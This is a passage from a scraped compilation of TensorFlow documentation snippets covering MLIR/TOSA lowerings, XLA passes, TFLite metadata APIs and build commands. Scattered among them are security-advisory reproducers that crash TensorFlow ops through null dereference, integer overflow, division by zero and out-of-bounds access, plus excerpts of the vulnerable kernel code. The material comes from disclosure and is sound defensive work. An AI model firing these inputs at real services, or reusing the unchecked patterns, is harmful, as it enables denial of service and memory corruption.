indices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())
interpreter.set_tensor(input_details[0]['index'], params_data)
interpreter.set_tensor(input_details[1]['index'], indices_data)

interpreter.invoke()
```

----------------------------------------

TITLE: Lowering tfl.ceil to TOSA MLIR
DESCRIPTION: Documents the lowering of the non-quantized TensorFlow Lite `tfl.ceil` operation, which computes the element-wise ceiling, to the TOSA dialect's `tosa.CEIL` operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_58

LANGUAGE: MLIR
CODE:
```
%y = tfl.ceil(%x)
```

LANGUAGE: MLIR
CODE:
```
%result = tosa.CEIL(%x)
```

----------------------------------------

TITLE: Lowering tfl.add_n to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow Lite `tfl.add_n` operation, which sums a list of tensors, to a sequence of TOSA `tosa.ADD` operations iteratively summing the input tensors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_50

LANGUAGE: MLIR
CODE:
```
%sum = tfl.add_n(%inputs)
```

LANGUAGE: MLIR
CODE:
```
%output = tosa.ADD(%inputs:0, %inputs:1)
for (int32 i = 2 i < %inputs.size i++) {
    %output = tosa.ADD(%inputs:i, %output)
}
```

----------------------------------------

TITLE: Sinking tf.Const into tf_device.cluster in MLIR
DESCRIPTION: This pass moves `tf.Const` operations that are implicitly captured and used within a `tf_device.cluster` region inside the cluster itself. This optimization reduces the number of arguments required for the function generated during the outlining pass.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_5

LANGUAGE: MLIR
CODE:
```
func @cluster() -> tensor<i32> {
  %const = "tf.Const"() {value = dense<0> : tensor<i32>} : () -> tensor<i32>
  %cluster = "tf_device.cluster"() ( {
    %identity = "tf.Identity"(%const) : (tensor<i32>) -> tensor<i32>
    tf_device.return %identity : tensor<i32>
  }) : () -> (tensor<i32>)
  return %cluster : tensor<i32>
}
```

LANGUAGE: MLIR
CODE:
```
func @cluster() -> tensor<i32> {
  %cluster = "tf_device.cluster"() ( {
    %const = "tf.Const"() {value = dense<0> : tensor<i32>} : () -> tensor<i32>
    %identity = "tf.Identity"(%const) : (tensor<i32>) -> tensor<i32>
    tf_device.return %identity : tensor<i32>
  }) : () -> (tensor<i32>)
  return %cluster : tensor<i32>
}
```

----------------------------------------

TITLE: Generate Multi-Process HLO Dumps with MPI Bash
DESCRIPTION: This command runs the PAX test script (`test-pax.sh`) using `mpirun` across 8 processes (`-np 8`) to generate HLO dumps in a multi-process context. It exports `XLA_FLAGS` to specify the dump directory and includes flags (`--fsdp 8`, `--batch-per-gpu 1`, `-o`, `--multiprocess`) relevant to the PAX model and distributed setup.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools_multihost_hlo_runner.md#_snippet_8

LANGUAGE: bash
CODE:
```
export XLA_FLAGS="--xla_dump_to=/tmp/dump_multi_process" mpirun --allow-run-as-root -np 8 test-pax.sh --fsdp 8 --batch-per-gpu 1 -o /tmp/checkpoint --multiprocess
```

----------------------------------------

TITLE: Initialize FeatureProperties Object in Python
DESCRIPTION: This method initializes a `FeatureProperties` object with a buffer and position. It's typically used internally after getting the root object or accessing nested objects within the buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/FeatureProperties.md#_snippet_3

LANGUAGE: python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Defining Custom CUDNN Redistribution JSON Format
DESCRIPTION: This JSON snippet defines the expected format for a custom `cudnn_redist.json` file. It maps CUDNN components, platforms, and CUDA versions to distribution paths. Similar to CUDA, `relative_path` is common, requiring a path prefix during initialization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_7

LANGUAGE: JSON
CODE:
```
{
   "cudnn": {
      "linux-x86_64": {
         "cuda12": {
         "relative_path": "cudnn/linux-x86_64/cudnn-linux-x86_64-9.0.0.312_cuda12-archive.tar.xz",
         }
      },
      "linux-sbsa": {
         "cuda12": {
         "relative_path": "cudnn/linux-sbsa/cudnn-linux-sbsa-9.0.0.312_cuda12-archive.tar.xz",
         }
      }
   }
}
```

----------------------------------------

TITLE: Example StableHLO CompositeCall - C++
DESCRIPTION: This example shows the HLO (High-Level Optimization) representation of a CompositeCall operation. It takes a constant input, applies a computation (%computation), and includes composite-specific attributes like name, version, and arbitrary key-value pairs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_5

LANGUAGE: C++
CODE:
```
f32[] call(f32[] %cst), to_apply=%computation, is_composite=true,
frontend_attributes = {
  composite.name="foo.bar",
  composite.attributes={n = 1 : i32, tensor = dense<1> : tensor<i32>},
  composite.version="1"
}
```

----------------------------------------

TITLE: Running TensorFlow Custom Op Tests (CPU) - Shell
DESCRIPTION: Provides the shell command using Bazel to execute the custom multiplex op tests specifically targeting the CPU environment. This command builds and runs the test defined as `multiplex_2_test` in the BUILD file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_2/README.md#_snippet_10

LANGUAGE: shell
CODE:
```
bazel test //third_party/tensorflow/google/g3doc/example/multiplex_2:multiplex_2_test
```

----------------------------------------

TITLE: Demonstrating SobolSample Vulnerability in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the vulnerability in `tf.raw_ops.SobolSample` where non-scalar inputs for `dim`, `num_results`, or `skip` can cause a `CHECK` failure due to missing validation. The code attempts to call the operation with `dim` as a list/tensor of shape `[2]` instead of a scalar.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-169.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
tf.raw_ops.SobolSample(dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1]))
```

----------------------------------------

TITLE: Checkout Specific LLVM Version - Bash
DESCRIPTION: Navigates into the cloned `llvm-project` directory and checks out the Git commit specified in the `../build_tools/llvm_version.txt` file. This ensures compatibility between MLIR-HLO and the LLVM/MLIR dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/README.md#_snippet_1

LANGUAGE: Bash
CODE:
```
(cd llvm-project && git checkout $(cat ../build_tools/llvm_version.txt))
```

----------------------------------------

TITLE: Adding Name to Tensor Group in TFLite Metadata - Python
DESCRIPTION: This function, `TensorGroupAddName`, is used within the context of building FlatBuffers for the TFLite metadata schema. It takes a FlatBuffers builder instance and a string `name` as input. Its purpose is to add the specified name field to the currently being constructed TensorGroup object in the metadata, likely by serializing the string and adding the appropriate offset reference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroupAddName.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorGroupAddName(
    builder, name
)
```

----------------------------------------

TITLE: Vulnerable TensorFlow ResourceGather C++ Kernel Logic
DESCRIPTION: This C++ snippet shows the part of the `ResourceGather` kernel implementation responsible for the vulnerability. The loops iterate based on `batch_dims_`. When `batch_dims_` exceeds the actual tensor rank (`params.dims()`), indexing `params.dim_size(i)` becomes invalid, leading to out-of-bounds access or a debug CHECK failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-128.md#_snippet_1

LANGUAGE: cpp
CODE:
```
// batch_dims_ = > params.dims() (10 > 2)
    for (int i = 0; i < batch_dims_; ++i) {
      result_shape.AddDim(params.dim_size(i));
    }
    for (int i = batch_dims_; i < indices.dims(); ++i) {
      result_shape.AddDim(indices.dim_size(i));
    }
    for (int i = batch_dims_ + 1; i < params.dims(); ++i) {
      result_shape.AddDim(params.dim_size(i));
    }
```

----------------------------------------

TITLE: Defining GRUBlockCellGrad Op Inputs (Python)
DESCRIPTION: This Python snippet defines the `tf.raw_ops.GRUBlockCellGrad` function call and a dictionary `para` containing specific input tensors/arrays for this operation. It is provided as context for the described Out of Bounds Read vulnerability (TFSA-2023-020), potentially illustrating inputs that could trigger the issue. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-020.md#_snippet_0

LANGUAGE: Python
CODE:
```
func = tf.raw_ops.GRUBlockCellGrad

para = {'x': [[21.1, 156.2], [83.3, 115.4]], 'h_prev': array([[136.5],
      [136.6]]), 'w_ru': array([[26.7,  0.8],
      [47.9, 26.1],
      [26.2, 26.3]]), 'w_c': array([[ 0.4],
      [31.5],
      [ 0.6]]), 'b_ru': array([0.1, 0.2 ], dtype=float32), 'b_c': 0x41414141, 'r': array([[0.3],
      [0.4]], dtype=float32), 'u': array([[5.7],
      [5.8]]), 'c': array([[52.9],
      [53.1]]), 'd_h': array([[172.2],
      [188.3 ]])}
```

----------------------------------------

TITLE: Getting Root as Object in Python
DESCRIPTION: This class method retrieves the root `ValueRange` object from a buffer. It takes the buffer (`buf`) and an optional starting `offset` as input. It is the current recommended way to get the root object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ValueRange.md#_snippet_0

LANGUAGE: Python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Demonstrating Overflow in tf.raw_ops.ImageProjectiveTransformV2 Python
DESCRIPTION: This Python snippet demonstrates the integer overflow vulnerability in `tf.raw_ops.ImageProjectiveTransformV2`. It calls the operation with intentionally large values for the `output_shape` parameter, which are shown to trigger the overflow condition described in the security advisory. The snippet uses constant tensors for input images, transforms, and the problematic output shape, along with specified interpolation and fill modes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-148.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

interpolation = "BILINEAR"
fill_mode = "REFLECT"
images = tf.constant(0.184634328, shape=[2,5,8,3], dtype=tf.float32)
transforms = tf.constant(0.378575385, shape=[2,8], dtype=tf.float32)
output_shape = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)
tf.raw_ops.ImageProjectiveTransformV2(images=images, transforms=transforms, output_shape=output_shape, interpolation=interpolation, fill_mode=fill_mode)
```

----------------------------------------

TITLE: Clustered Replicated TPU Computation MLIR
DESCRIPTION: Example showing the result of applying the `-tf-tpu-cluster-formation` pass to a replicated TPU computation in MLIR. The cluster is wrapped in a `tf_device.replicate` operation, and `tf.TPUReplicatedInput`/`tf.TPUReplicatedOutput` are handled by the replicate op's operands/results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_49

LANGUAGE: mlir
CODE:
```
func @tpu_computation(%arg0: tensor<i32>, %arg1: tensor<i32>) -> (tensor<i32>, tensor<i32>) {
  %replicate:2 = tf_device.replicate([%arg0, %arg1] as %replicated_input) {n = 2 : i32} {
    %cluster = "tf_device.cluster"() ( {
      %identity = "tf.Identity"(%replicated_input) : (tensor<i32>) -> tensor<i32>
      tf_device.return %identity : tensor<i32>
    }) {_xla_compile_device_type = "TPU", _replication_info = "cluster", num_cores_per_replica = 1, topology = "topology", device_assignment = [], padding_map = []} : () -> (tensor<i32>)
    tf_device.return %cluster : tensor<i32>
  }
  return %replicate#0, %replicate#1 : tensor<i32>, tensor<i32>
}
```

----------------------------------------

TITLE: Binding XLA FFI Handler for Type-Constrained Buffers
DESCRIPTION: Demonstrates how to create an XLA FFI handler that enforces a specific data type (`F32`) for buffer arguments and results using `Buffer<T>`, while allowing any number of dimensions. The handler receives typed pointers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_3

LANGUAGE: C++
CODE:
```
// Buffers of any number of dimensions and F32 data type.
auto handler = Ffi::Bind().Arg<Buffer<F32>>().Ret<Buffer<F32>>().To(
    [](Buffer<F32> arg, Result<Buffer<F32>> res) -> Error {
      float* arg_data = arg.typed_data();
      float* res_data = res->typed_data();
      return Error::Success();
    });
```

----------------------------------------

TITLE: Accessing dimension size in TensorFlow kernel (C++)
DESCRIPTION: This C++ snippet from the TensorFlow kernel shows how the `depth` variable is calculated using the user-controlled `axis_` value. It highlights the use of `input.dim_size(axis_)`, which becomes problematic when `axis_` is outside the valid range due to missing bounds checks in release builds.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-027.md#_snippet_1

LANGUAGE: C++
CODE:
```
const int depth = (axis_ == -1) ? 1 : input.dim_size(axis_);
```

----------------------------------------

TITLE: Demonstrating RaggedTensorToTensor Null Pointer Vulnerability in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how providing an empty list for the `row_partition_types` argument in `tf.raw_ops.RaggedTensorToTensor` triggers a null pointer dereference vulnerability. It shows a minimal example using `tf.constant` for `row_partition_tensors` to reproduce the issue described in TFSA-2021-112.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-112.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.RaggedTensorToTensor(
  shape=1,
  values=10,
  default_value=21,
  row_partition_tensors=tf.constant([0,0,0,0]),
  row_partition_types=[])
```

----------------------------------------

TITLE: MLIR Original Function with Subgraph Calls (MLIR)
DESCRIPTION: The modified original MLIR function after the `Raise Target Subgraphs Pass`, where the device-annotated operations have been replaced by `call` instructions. These calls delegate execution to the newly generated private functions (`@func_0_GPU_FLOAT`, `@func_1_GPU_FLOAT`, `@func_2_CPU_FLOAT`) that contain the device-specific subgraphs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/lite/experimental/tac/README.md#_snippet_7

LANGUAGE: MLIR
CODE:
```
func @simpleTest(%arg0: tensor<1xf32>, %arg1: tensor<1xf32>, %arg2: tensor<1xf32>, %arg3: tensor<1xf32>) -> tensor<2x1xf32> {
    %0 = call @func_0_GPU_FLOAT(%arg0, %arg1, %arg2) {tac.device = "GPU", tac.inference_type = "FLOAT", tac.interface_name = "func_0"} : (tensor<1xf32>, tensor<1xf32>, tensor<1xf32>) -> tensor<1xf32>
    %1 = call @func_1_GPU_FLOAT(%arg0, %arg3) {tac.device = "GPU", tac.inference_type = "FLOAT", tac.interface_name = "func_1"} : (tensor<1xf32>, tensor<1xf32>) -> tensor<1xf32>
    %2 = call @func_2_CPU_FLOAT(%0, %1) {tac.device = "CPU", tac.inference_type = "FLOAT", tac.interface_name = "func_2"} : (tensor<1xf32>, tensor<1xf32>) -> tensor<2x1xf32>
    return %2 : tensor<2x1xf32>
  }
```

----------------------------------------

TITLE: Triggering PNG Encoding Vulnerability in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger the denial of service vulnerability in `tf.raw_ops.EncodePng` by providing an empty tensor. The code creates a 0x0x3 tensor of uint8 type and attempts to encode it, which causes a crash in the underlying C++ implementation due to a null pointer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-020.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

image = tf.zeros([0, 0, 3])
image = tf.cast(image, dtype=tf.uint8)
tf.raw_ops.EncodePng(image=image)
```

----------------------------------------

TITLE: Start Process Units Vector for TFLite Tensor Metadata (Python)
DESCRIPTION: This Python function is used during the FlatBuffer building process for TensorFlow Lite metadata. It prepares a vector (like a list or array) within a `TensorMetadata` object to store `ProcessUnit` elements. It takes the FlatBuffer `builder` instance and the expected number of elements (`numElems`) as arguments, which is crucial for memory allocation and structure setup within the FlatBuffer binary format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataStartProcessUnitsVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorMetadataStartProcessUnitsVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Reproducing Crash in tf.transpose Python
DESCRIPTION: This snippet demonstrates how to trigger the TFSA-2021-105 vulnerability. It imports the TensorFlow library and calls the `tf.transpose` function with a complex number input and the `conjugate=True` argument, which results in a crash in affected TensorFlow versions. It requires a vulnerable TensorFlow version.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-105.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
tf.transpose(conjugate=True, a=complex(1))
```

----------------------------------------

TITLE: Access BoundingBoxProperties Type Python
DESCRIPTION: Retrieves the type of the bounding box properties. This method returns the enumerated value representing the specific structure type of the bounding box properties.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxProperties.md#_snippet_9

LANGUAGE: Python
CODE:
```
Type()
```

----------------------------------------

TITLE: Triggering Division by Zero in TensorFlow InplaceSub Python
DESCRIPTION: This snippet demonstrates a vulnerability in TensorFlow's `tf.raw_ops.InplaceSub` where crafted empty inputs can lead to a division by zero error. It imports TensorFlow and calls the operation with specific list arguments for 'x', 'i', and 'v'. This code is an example of how the vulnerability can be exploited.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-134.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.InplaceSub(x=[],i=[-99,-1,-1],v=[1,1,1])
```

----------------------------------------

TITLE: Demonstrating FPE in TensorFlow TensorListSplit with XLA (Python)
DESCRIPTION: This Python snippet demonstrates the Floating Point Exception vulnerability in `tf.raw_ops.TensorListSplit` when compiled with XLA (`jit_compile=True`). It sets up specific parameters for the operation and calls it within a JIT-compiled function to trigger the FPE. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-011.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

func = tf.raw_ops.TensorListSplit
para = {'tensor': [1], 'element_shape': -1, 'lengths': [0]}

@tf.function(jit_compile=True)
def fuzz_jit():
 y = func(**para)
 return y

print(fuzz_jit())
```

----------------------------------------

TITLE: Identifying Vulnerable Implementation in DrawBoundingBoxesV2 Kernel (C++)
DESCRIPTION: This C++ code snippet shows the vulnerable part of the `DrawBoundingBoxesV2` kernel implementation responsible for processing the bounding box coordinates. It iterates through bounding boxes (`bb`) and accesses elements from the `tboxes` tensor using fixed indices (0, 1, 2, 3) assuming the last dimension is at least 4. The vulnerability arises because the code lacks a check to ensure this dimension is indeed 4, allowing out-of-bounds reads (and subsequent writes not shown here) if an attacker provides a `boxes` tensor with a smaller last dimension.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-059.md#_snippet_1

LANGUAGE: c++
CODE:
```
const auto tboxes = boxes.tensor<T, 3>();
for (int64 bb = 0; bb < num_boxes; ++bb) {
  ...
  const int64 min_box_row = static_cast<float>(tboxes(b, bb, 0)) * (height - 1);
  const int64 max_box_row = static_cast<float>(tboxes(b, bb, 2)) * (height - 1);
  const int64 min_box_col = static_cast<float>(tboxes(b, bb, 1)) * (width - 1);
  const int64 max_box_col = static_cast<float>(tboxes(b, bb, 3)) * (width - 1);
  ...
}
```

----------------------------------------

TITLE: HLO Broadcast Example for Indexing Map Analysis (HLO Pseudo-code)
DESCRIPTION: This snippet provides the HLO definition for a broadcast operation, which serves as the subject for the subsequent explanation of output-to-input and input-to-output indexing maps. A `f32[20]` parameter `p0` is broadcast to `f32[10, 20, 30]` along dimensions={1}.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/indexing.md#_snippet_3

LANGUAGE: HLO Pseudo-code
CODE:
```
p0 = f32[20] parameter(0)
bc0 = f32[10, 20, 30] broadcast(p0), dimensions={1}
```

----------------------------------------

TITLE: Running TensorFlowLite Swift Tests (Shell)
DESCRIPTION: Executes the Bazel target ':Tests' for the TensorFlow Lite Swift library. The '--swiftcopt=-enable-testing' flag is included, which is specifically required to enable testing features when building with optimization ('-c opt').
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/swift/README.md#_snippet_5

LANGUAGE: shell
CODE:
```
bazel test tensorflow/lite/swift:Tests --swiftcopt=-enable-testing
```

----------------------------------------

TITLE: Demonstrating Integer Overflow in TensorFlow StringNGrams Python
DESCRIPTION: This Python snippet demonstrates the integer overflow vulnerability in `tf.raw_ops.StringNGrams`. Providing negative values for `ngram_widths` causes an integer conversion issue in the underlying C++ kernel, leading to a 'Bad alloc' during memory allocation. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-120.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.StringNGrams(
  data=['',''],
  data_splits=[0,2],
  separator=' '*100,
  ngram_widths=[-80,0,0,-60],
  left_pad=' ',
  right_pad=' ',
  pad_width=100,
  preserve_short_sequences=False)
```

----------------------------------------

TITLE: Defining MhloDialect Library and Dependencies
DESCRIPTION: This command defines the `MhloDialect` library target, specifying its source files (`hlo_ops.cc`, `mhlo_bytecode.cc`) and dependencies on the various generated TableGen targets.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/IR/CMakeLists.txt#_snippet_6

LANGUAGE: cmake
CODE:
```
add_mlir_dialect_library(MhloDialect
  hlo_ops.cc
  mhlo_bytecode.cc

  DEPENDS
  MLIRhlo_opsIncGen
  MLIRMhloCanonicalizeIncGen
  MLIRMhloRewriterIncGen
)
```

----------------------------------------

TITLE: Helper Function to Add Image Width in TFLite Metadata (Python)
DESCRIPTION: This function serves as a helper, likely generated by FlatBuffers or similar schema tools. It is designed to be called during the process of building an `ImageSize` object to add the `width` field using a FlatBuffer builder.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageSizeAddWidth.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ImageSizeAddWidth(
    builder, width
)
```

----------------------------------------

TITLE: Demonstrating Zero and Large Shape in Numpy (Python)
DESCRIPTION: This Python snippet demonstrates the creation of a numpy array shape that triggers the underlying vulnerability. The shape contains both a zero dimension (0) and very large dimensions (2**31), which causes `PyArray_SimpleNewFromData` to return null, leading to issues when this shape is later used or converted within TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-146.md#_snippet_0

LANGUAGE: python
CODE:
```
np.ones((0, 2**31, 2**31))
```

----------------------------------------

TITLE: Demonstrating Dequantize Shape Inference Vulnerability - TensorFlow Python
DESCRIPTION: This snippet provides a minimal reproducible example to demonstrate a denial of service vulnerability in TensorFlow's `tf.raw_ops.Dequantize`. It calls the operation with an invalid negative value for the `axis` parameter and empty `min_range`/`max_range` tensors, which triggers a segfault in vulnerable versions. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-151.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.compat.v1.disable_v2_behavior()
tf.raw_ops.Dequantize(
  input_tensor = tf.constant(-10.0, dtype=tf.float32),
  input_tensor = tf.cast(input_tensor, dtype=tf.quint8),
  min_range = tf.constant([], shape=[0], dtype=tf.float32),
  max_range = tf.constant([], shape=[0], dtype=tf.float32),
  mode  = 'MIN_COMBINED',
  narrow_range=False,
  axis=-10,
  dtype=tf.dtypes.float32)
```

----------------------------------------

TITLE: Getting Root As TensorGroup | TensorFlow Lite Support Python
DESCRIPTION: Class method to initialize a `TensorGroup` object from a buffer. It takes the buffer and an optional offset. This is the recommended method for initializing from a FlatBuffers buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroup.md#_snippet_0

LANGUAGE: python
CODE:
```
@classmethod
GetRootAs(
 buf, offset=0
)
```

----------------------------------------

TITLE: MLIR Function Before Subgraph Raising (MLIR)
DESCRIPTION: Represents an MLIR function containing TensorFlow Lite operations (`tfl.add`, `tfl.mul`, `tfl.pack`) annotated with the `tac.device` attribute indicating their intended target hardware. This snippet demonstrates the state of the MLIR graph before the `Raise Target Subgraphs Pass` segregates operations by device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/lite/experimental/tac/README.md#_snippet_4

LANGUAGE: MLIR
CODE:
```
func @simpleTest(%arg0: tensor<1xf32>, %arg1: tensor<1xf32>, %arg2: tensor<1xf32>, %arg3: tensor<1xf32>) -> tensor<2x1xf32> {
  %0 = "tfl.add"(%arg0, %arg1) {tac.device = "GPU", fused_activation_function = "RELU6", tac.inference_type = "FLOAT"} : (tensor<1xf32>, tensor<1xf32>) -> tensor<1xf32>
  %1 = "tfl.mul"(%0, %arg2) {tac.device = "GPU", fused_activation_function = "RELU6", tac.inference_type = "FLOAT"} : (tensor<1xf32>, tensor<1xf32>) -> tensor<1xf32>
  %2 = "tfl.add"(%arg0, %arg3) {tac.device = "GPU", fused_activation_function = "RELU6", tac.inference_type = "FLOAT"} : (tensor<1xf32>, tensor<1xf32>) -> tensor<1xf32>
  %3 = "tfl.pack"(%1, %2) {tac.device = "CPU", tac.inference_type = "FLOAT", axis = 0 : i32, values_count = 2 : i32} : (tensor<1xf32>, tensor<1xf32>) -> tensor<2x1xf32>
  return %3 : tensor<2x1xf32>
}
```

----------------------------------------

TITLE: Triggering Type Confusion with truncated_normal / TensorFlow / Python
DESCRIPTION: This Python snippet demonstrates one method to trigger the CVE-2021-29513 vulnerability. It calls `tf.random.truncated_normal` but explicitly sets the `dtype` to 20 (likely corresponding to a vulnerable non-numeric type like `tf.resource`), which violates the operation's expectation of a numeric type, leading to the described null pointer dereference in the backend.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-003.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np
data = tf.random.truncated_normal(shape=1,mean=np.float32(20.8739),stddev=779.973,dtype=20,seed=64)
```

----------------------------------------

TITLE: Validating TFLite Input Tensor Data - C++
DESCRIPTION: This C++ code snippet from the TFLite subgraph execution logic performs validation on input tensors. It checks if a tensor has a null data buffer but a non-zero byte size, which is generally an error to prevent null pointer dereferences. However, it includes a specific exception for the second input (index 1) of the Reshape operator, allowing its data buffer to be null because this input is intended for shape information, not raw data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-079.md#_snippet_0

LANGUAGE: C++
CODE:
```
if (tensor->data.raw == nullptr && tensor->bytes > 0) {
  if (registration.builtin_code == kTfLiteBuiltinReshape && i == 1) {
    // In general, having a tensor here with no buffer will be an error.
    // However, for the reshape operator, the second input tensor is only
    // used for the shape, not for the data. Thus, null buffer is ok.
    continue;
  } else {
    // In all other cases, we need to return an error as otherwise we will
    // trigger a null pointer dereference (likely).
    ReportError("Input tensor %d lacks data", tensor_index);
    return kTfLiteError;
  }
}
```

----------------------------------------

TITLE: Lowering ReverseV2 Operation to TOSA (MLIR)
DESCRIPTION: This function lowers a reverse_v2 operation to the TOSA dialect. It handles the case where no axes are specified by returning the input tensor identity. If axes are provided, it iteratively applies the TOSA REVERSE operation for each axis specified in the axis tensor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_18

LANGUAGE: MLIR/TOSA
CODE:
```
Value lower_reverse_v2_op(Value %tensor, Value %axis)
{
    Value %output = %tensor

    if (%axis.num_elements == 0) {
       %output = tosa.IDENTITY(%tensor)
    } else {
        for (int32 i = 0; i < %axis.shape[0]; i++) {
            size_t axis_val = positive_axis(%axis.as_constant()[i])
            %output = tosa.REVERSE(%output) {axis=%axis_val}
        }
    }

    return %output
}
```

----------------------------------------

TITLE: Lowering Unpack Op to TOSA (MLIR)
DESCRIPTION: This function lowers an unpack operation by splitting a tensor along a specified axis. It first optionally transposes the tensor to make the split axis the leading dimension. Then, it iterates along this dimension, slicing the tensor into individual elements or sub-tensors and reshaping each slice to remove the split dimension. The results are combined into a list of tensors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_28

LANGUAGE: MLIR
CODE:
```
Value lower_unpack_op(Value %value, size_t axis, uint64_t num)
{
    axis = positive_axis(axis)

    Value %output_arr[]

    // Step 1: transpose 'axis' to left-most dimension, if necessary
    Value %transposed_value

    if (axis != 0) {
       vector <size_t> perms

       perms.push_back(axis)
       for (int32 i = 0; i < %input.rank; i++) {
           if (i != axis)
              perms.push_back(i)
       }

       %transposed_value = tosa.TRANSPOSE(%value) {perms=perms}

   } else {
      %transposed_value = %value
   }

   // Step 2: Slice [N, A, B, C] into [N] [A, B, C]
   for (int32 i = 0; i < %transposed_value.rank; i++) {
       vector <size_t> begin_vals, size_vals, shape_vals

       begin_vals.push_back(i)
       size_vals.push_back(1)

       for (int32 j = 1; j < %transposed_value.rank; j++) {
           begin_vals.push_back(0)
           size_vals.push_back(transposed_value.shape[j])
           shape_vals.push_back(transposed_value.shape[j])
       }

       %slice = %tosa.SLICE(%transposed_value) {begin=begin_vals, size=size_vals}
       %output_arr[i] = %tosa.RESHAPE(%slice) {new_shape=shape_vals} {begin=begin_vals, size=size_vals}
